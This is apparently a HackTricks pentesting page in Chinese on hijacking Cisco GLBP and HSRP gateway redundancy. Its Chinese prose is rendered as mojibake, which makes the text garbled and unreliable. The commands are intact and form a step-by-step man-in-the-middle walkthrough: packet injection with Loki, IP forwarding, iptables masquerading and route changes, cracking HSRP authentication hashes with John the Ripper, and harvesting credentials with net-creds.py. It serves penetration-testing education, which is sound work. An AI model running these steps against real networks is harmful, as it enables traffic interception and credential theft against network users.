# GLBP & HSRP æ”»å‡»

<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹  AWS é»‘å®¢æ”»å‡»ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>!</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœä½ æƒ³åœ¨ **HackTricks** ä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTs é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚

</details>


## FHRP åŠ«æŒæ¦‚è¿°

### ç†è§£ FHRP
First Hop Redundancy Protocol (FHRP) æ˜¯ä¸€å¥—ç¡®ä¿ç½‘ç»œå¼¹æ€§çš„åè®®ï¼Œé€šè¿‡å°†å¤šä¸ªç‰©ç†è·¯ç”±å™¨ç»„åˆæˆä¸€ä¸ªè™šæ‹Ÿå®ä½“æ¥å®ç°ã€‚è¿™å¢å¼ºäº†è´Ÿè½½åˆ†é…å’Œå®¹é”™èƒ½åŠ›ã€‚Cisco Systems å¼•å…¥äº†ä¸¤ä¸ªå€¼å¾—æ³¨æ„çš„ FHRP åè®®ï¼šGLBP å’Œ HSRPã€‚

### GLBP åè®®è¯¦æƒ…
ç”± Cisco å¼€å‘çš„ GLBP (Gateway Load Balancing Protocol) åœ¨ TCP/IP å †æ ˆä¹‹ä¸Šè¿è¡Œï¼Œä½¿ç”¨ UDP ç«¯å£ 3222 è¿›è¡Œé€šä¿¡ã€‚GLBP ç»„å†…çš„è·¯ç”±å™¨æ¯ 3 ç§’å‘é€ä¸€æ¬¡ "hello" æ•°æ®åŒ…ã€‚å¦‚æœ 10 ç§’å†…æ²¡æœ‰æ”¶åˆ°æŸä¸ªè·¯ç”±å™¨çš„è¿™äº›æ•°æ®åŒ…ï¼Œåˆ™è¡¨æ˜å®ƒå·²ç»å¤±æ•ˆã€‚ç„¶è€Œï¼Œè¿™äº›è®¡æ—¶å™¨è®¾ç½®æ˜¯å¯è°ƒçš„ã€‚

### GLBP æ“ä½œå’Œè´Ÿè½½å‡è¡¡
GLBP é€šè¿‡ä½¿ç”¨å•ä¸ªè™šæ‹Ÿ IP å’Œå¤šä¸ªè™šæ‹Ÿ MAC åœ°å€å®ç°äº†å¤šä¸ªè·¯ç”±å™¨ä¹‹é—´çš„è´Ÿè½½å…±äº«ã€‚ç»„å†…çš„æ¯ä¸ªè·¯ç”±å™¨éƒ½å‚ä¸æ•°æ®åŒ…çš„è½¬å‘ã€‚GLBP ä¸ HSRP/VRRP çš„ä¸åŒä¹‹å¤„åœ¨äºå®ƒæä¾›äº†çœŸæ­£çš„è´Ÿè½½å‡è¡¡ï¼ŒåŒ…æ‹¬ï¼š

- **ä¸»æœºä¾èµ–ï¼š** ç¡®ä¿ä¸»æœºæ¥æ”¶åˆ°ç›¸åŒçš„ AVF MAC åœ°å€ï¼Œä¿ç•™ NAT é…ç½®ã€‚
- **è½®è¯¢ï¼š** é»˜è®¤æ¨¡å¼ï¼ŒAVF MAC åœ°å€äº¤æ›¿åˆ†é…ã€‚
- **åŸºäºæƒé‡çš„è½®è¯¢ï¼š** æ ¹æ®é¢„å®šä¹‰çš„ "æƒé‡" æŒ‡æ ‡å¹³è¡¡è´Ÿè½½ã€‚

### GLBP é¢†åŸŸè§’è‰²å’Œæœ¯è¯­
- **AVG (Active Virtual Gateway)ï¼š** ä¸»è·¯ç”±å™¨ï¼Œå‘å…¶ä»–è·¯ç”±å™¨åˆ†é… MAC åœ°å€ã€‚
- **AVF (Active Virtual Forwarder)ï¼š** å¤„ç†ç½‘ç»œæµé‡çš„è·¯ç”±å™¨ã€‚
- **GLBP ä¼˜å…ˆçº§ï¼š** å†³å®š AVGï¼Œç¼ºçœå€¼ä¸º 100ï¼ŒèŒƒå›´ä» 1 åˆ° 255ã€‚
- **GLBP æƒé‡ï¼š** è¡¨ç¤ºè·¯ç”±å™¨çš„è´Ÿè½½æ°´å¹³ï¼Œå¯ä»¥æ‰‹åŠ¨è°ƒæ•´æˆ–é€šè¿‡å¯¹è±¡è·Ÿè¸ªè¿›è¡Œè°ƒæ•´ã€‚
- **GLBP è™šæ‹Ÿ IP åœ°å€ï¼š** ä½œä¸ºè¿æ¥è®¾å¤‡çš„é»˜è®¤ç½‘å…³ã€‚

GLBP ä½¿ç”¨ä¿ç•™çš„ç»„æ’­åœ°å€ 224.0.0.102 å’Œ UDP ç«¯å£ 3222 è¿›è¡Œé€šä¿¡ã€‚æ¯ 3 ç§’å‘é€ä¸€æ¬¡ "hello" æ•°æ®åŒ…ï¼Œå¦‚æœ 10 ç§’å†…æ²¡æœ‰æ”¶åˆ°æ•°æ®åŒ…ï¼Œè·¯ç”±å™¨å°±ä¼šè¢«æ ‡è®°ä¸º "æ­»äº¡"ã€‚

### GLBP æ”»å‡»æœºåˆ¶
æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€å…·æœ‰æœ€é«˜ä¼˜å…ˆçº§å€¼ (255) çš„ GLBP æ•°æ®åŒ…æˆä¸ºä¸»è·¯ç”±å™¨ã€‚è¿™å¯èƒ½å¯¼è‡´ DoS æˆ– MITM æ”»å‡»ï¼Œå…è®¸æµé‡æˆªå–æˆ–é‡å®šå‘ã€‚

### ä½¿ç”¨ Loki æ‰§è¡Œ GLBP æ”»å‡»
[Loki](https://github.com/raizo62/loki_on_kali) å¯ä»¥é€šè¿‡æ³¨å…¥ä¼˜å…ˆçº§å’Œæƒé‡å‡è®¾ç½®ä¸º 255 çš„æ•°æ®åŒ…æ¥æ‰§è¡Œ GLBP æ”»å‡»ã€‚æ”»å‡»å‰çš„æ­¥éª¤åŒ…æ‹¬ä½¿ç”¨ Wireshark ç­‰å·¥å…·æ”¶é›†ä¿¡æ¯ï¼Œå¦‚è™šæ‹Ÿ IP åœ°å€ã€è®¤è¯å­˜åœ¨ä¸å¦ä»¥åŠè·¯ç”±å™¨ä¼˜å…ˆçº§å€¼ã€‚

æ”»å‡»æ­¥éª¤ï¼š
1. åˆ‡æ¢åˆ°æ··æ‚æ¨¡å¼å¹¶å¯ç”¨ IP è½¬å‘ã€‚
2. è¯†åˆ«ç›®æ ‡è·¯ç”±å™¨å¹¶æ£€ç´¢å…¶ IPã€‚
3. ç”Ÿæˆä¸€ä¸ª Gratuitous ARPã€‚
4. æ³¨å…¥æ¶æ„ GLBP æ•°æ®åŒ…ï¼Œå†’å…… AVGã€‚
5. ä¸ºæ”»å‡»è€…çš„ç½‘ç»œæ¥å£åˆ†é…ä¸€ä¸ªæ¬¡è¦ IP åœ°å€ï¼Œåæ˜  GLBP è™šæ‹Ÿ IPã€‚
6. å®æ–½ SNAT ä»¥å®Œå…¨æŸ¥çœ‹æµé‡ã€‚
7. è°ƒæ•´è·¯ç”±ä»¥ç¡®ä¿é€šè¿‡åŸå§‹ AVG è·¯ç”±å™¨ç»§ç»­è®¿é—®äº’è”ç½‘ã€‚

é€šè¿‡éµå¾ªè¿™äº›æ­¥éª¤ï¼Œæ”»å‡»è€…å°†è‡ªå·±å®šä½ä¸º "ä¸­é—´äºº"ï¼Œèƒ½å¤Ÿæˆªå–å’Œåˆ†æç½‘ç»œæµé‡ï¼ŒåŒ…æ‹¬æœªåŠ å¯†æˆ–æ•æ„Ÿæ•°æ®ã€‚

ä¸ºäº†æ¼”ç¤ºï¼Œè¿™é‡Œæ˜¯æ‰€éœ€çš„å‘½ä»¤ç‰‡æ®µï¼š
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
ç›‘æ§å’Œæ‹¦æˆªæµé‡å¯ä»¥ä½¿ç”¨ net-creds.py æˆ–ç±»ä¼¼å·¥å…·æ¥æ•è·å’Œåˆ†æé€šè¿‡å—æŸç½‘ç»œæµåŠ¨çš„æ•°æ®ã€‚

### HSRP åŠ«æŒçš„è¢«åŠ¨è§£é‡Šä¸å‘½ä»¤è¯¦æƒ…

#### HSRPï¼ˆçƒ­å¤‡ç”¨è·¯ç”±å™¨/å†—ä½™åè®®ï¼‰æ¦‚è¿°
HSRP æ˜¯ Cisco ä¸“æœ‰åè®®ï¼Œæ—¨åœ¨ä¸ºç½‘ç»œç½‘å…³å†—ä½™è®¾è®¡ã€‚å®ƒå…è®¸å°†å¤šä¸ªç‰©ç†è·¯ç”±å™¨é…ç½®ä¸ºä¸€ä¸ªå…·æœ‰å…±äº« IP åœ°å€çš„å•ä¸ªé€»è¾‘å•å…ƒã€‚è¿™ä¸ªé€»è¾‘å•å…ƒç”±è´Ÿè´£æŒ‡å¯¼æµé‡çš„ä¸»è·¯ç”±å™¨ç®¡ç†ã€‚ä¸ä½¿ç”¨ä¼˜å…ˆçº§å’Œæƒé‡è¿›è¡Œè´Ÿè½½å¹³è¡¡çš„ GLBP ä¸åŒï¼ŒHSRP ä¾èµ–å•ä¸ªæ´»åŠ¨è·¯ç”±å™¨è¿›è¡Œæµé‡ç®¡ç†ã€‚

#### HSRP ä¸­çš„è§’è‰²å’Œæœ¯è¯­
- **HSRP æ´»åŠ¨è·¯ç”±å™¨**ï¼šä½œä¸ºç½‘å…³çš„è®¾å¤‡ï¼Œç®¡ç†æµé‡æµåŠ¨ã€‚
- **HSRP å¤‡ç”¨è·¯ç”±å™¨**ï¼šå¤‡ä»½è·¯ç”±å™¨ï¼Œå¦‚æœæ´»åŠ¨è·¯ç”±å™¨å¤±è´¥ï¼Œå‡†å¤‡æ¥ç®¡ã€‚
- **HSRP ç»„**ï¼šä¸€ç»„åä½œçš„è·¯ç”±å™¨ï¼Œå½¢æˆä¸€ä¸ªå•ä¸€çš„å¼¹æ€§è™šæ‹Ÿè·¯ç”±å™¨ã€‚
- **HSRP MAC åœ°å€**ï¼šåœ¨ HSRP è®¾ç½®ä¸­åˆ†é…ç»™é€»è¾‘è·¯ç”±å™¨çš„è™šæ‹Ÿ MAC åœ°å€ã€‚
- **HSRP è™šæ‹Ÿ IP åœ°å€**ï¼šHSRP ç»„çš„è™šæ‹Ÿ IP åœ°å€ï¼Œä½œä¸ºè¿æ¥è®¾å¤‡çš„é»˜è®¤ç½‘å…³ã€‚

#### HSRP ç‰ˆæœ¬
HSRP æœ‰ä¸¤ä¸ªç‰ˆæœ¬ï¼ŒHSRPv1 å’Œ HSRPv2ï¼Œä¸»è¦åŒºåˆ«åœ¨äºç»„å®¹é‡ã€å¤šæ’­ IP ä½¿ç”¨å’Œè™šæ‹Ÿ MAC åœ°å€ç»“æ„ã€‚è¯¥åè®®ä½¿ç”¨ç‰¹å®šçš„å¤šæ’­ IP åœ°å€è¿›è¡ŒæœåŠ¡ä¿¡æ¯äº¤æ¢ï¼Œæ¯ 3 ç§’å‘é€ä¸€æ¬¡ Hello æ•°æ®åŒ…ã€‚å¦‚æœåœ¨ 10 ç§’é—´éš”å†…æœªæ”¶åˆ°æ•°æ®åŒ…ï¼Œè·¯ç”±å™¨è¢«å‡å®šä¸ºä¸æ´»åŠ¨çŠ¶æ€ã€‚

#### HSRP æ”»å‡»æœºåˆ¶
HSRP æ”»å‡»æ¶‰åŠé€šè¿‡æ³¨å…¥æœ€å¤§ä¼˜å…ˆçº§å€¼å¼ºåˆ¶æ¥ç®¡æ´»åŠ¨è·¯ç”±å™¨çš„è§’è‰²ã€‚è¿™å¯èƒ½å¯¼è‡´ä¸­é—´äººæ”»å‡»ï¼ˆMITMï¼‰ã€‚æ”»å‡»å‰çš„é‡è¦æ­¥éª¤åŒ…æ‹¬æ”¶é›†æœ‰å…³ HSRP è®¾ç½®çš„æ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨ Wireshark è¿›è¡Œæµé‡åˆ†ææ¥å®Œæˆã€‚

#### ç»•è¿‡ HSRP è®¤è¯çš„æ­¥éª¤
1. å°†åŒ…å« HSRP æ•°æ®çš„ç½‘ç»œæµé‡ä¿å­˜ä¸º .pcap æ–‡ä»¶ã€‚
```shell
tcpdump -w hsrp_traffic.pcap
```
2. ä½¿ç”¨ hsrp2john.py ä» .pcap æ–‡ä»¶ä¸­æå– MD5 å“ˆå¸Œã€‚
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. ä½¿ç”¨ John the Ripper ç ´è§£ MD5 å“ˆå¸Œã€‚
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**ä½¿ç”¨ Loki æ‰§è¡Œ HSRP æ³¨å…¥**

1. å¯åŠ¨ Loki ä»¥è¯†åˆ« HSRP å¹¿å‘Šã€‚
2. å°†ç½‘ç»œæ¥å£è®¾ç½®ä¸ºæ··æ‚æ¨¡å¼å¹¶å¯ç”¨ IP è½¬å‘ã€‚
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. ä½¿ç”¨ Loki é’ˆå¯¹ç‰¹å®šè·¯ç”±å™¨ï¼Œè¾“å…¥ç ´è§£çš„ HSRP å¯†ç ï¼Œå¹¶æ‰§è¡Œå¿…è¦çš„é…ç½®ä»¥å†’å……æ´»åŠ¨è·¯ç”±å™¨ã€‚
4. åœ¨è·å¾—æ´»åŠ¨è·¯ç”±å™¨è§’è‰²åï¼Œé…ç½®ç½‘ç»œæ¥å£å’Œ IP è¡¨ä»¥æ‹¦æˆªåˆæ³•æµé‡ã€‚
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. ä¿®æ”¹è·¯ç”±è¡¨ï¼Œé€šè¿‡å‰æ´»åŠ¨è·¯ç”±å™¨è·¯ç”±æµé‡ã€‚
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. ä½¿ç”¨ net-creds.py æˆ–ç±»ä¼¼å·¥å…·æ•è·ä»æ‹¦æˆªæµé‡ä¸­çš„å‡­è¯ã€‚
```shell
sudo python2 net-creds.py -i eth0
```

æ‰§è¡Œè¿™äº›æ­¥éª¤ä½¿æ”»å‡»è€…èƒ½å¤Ÿæ‹¦æˆªå’Œæ“çºµæµé‡ï¼Œç±»ä¼¼äº GLBP åŠ«æŒçš„ç¨‹åºã€‚è¿™çªå‡ºäº†åƒ HSRP è¿™æ ·çš„å†—ä½™åè®®çš„æ¼æ´ä»¥åŠå¯¹å¼ºå¤§å®‰å…¨æªæ–½çš„éœ€æ±‚ã€‚


# å‚è€ƒèµ„æ–™
- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹  AWS é»‘å®¢æ”»å‡»</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœä½ æƒ³åœ¨ **HackTricks** ä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFT é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚

</details>
